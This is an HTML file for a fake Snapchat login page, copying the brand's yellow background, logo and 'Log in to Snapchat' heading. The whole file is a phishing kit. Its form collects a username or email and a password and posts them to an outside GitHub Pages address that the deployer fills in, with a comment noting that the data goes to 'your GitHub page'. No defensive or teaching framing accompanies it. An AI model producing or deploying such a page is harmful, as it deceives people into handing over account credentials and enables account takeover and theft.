<!DOCTYPE html>
<html>
<head>
    <title>Snapchat Login</title>
    <style>
        body { background-color: #fffc00; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background-color: black; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        img { width: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Snapchat Logo URL -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat">
        <h2>Log in to Snapchat</h2>
        
        <!-- Form sends data to your GitHub page -->
        <form action="https://your-github-username.github.io/data.html" method="POST">
            <input type="text" name="email" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">LOG IN</button>
        </form>
    </div>
</body>
</html>
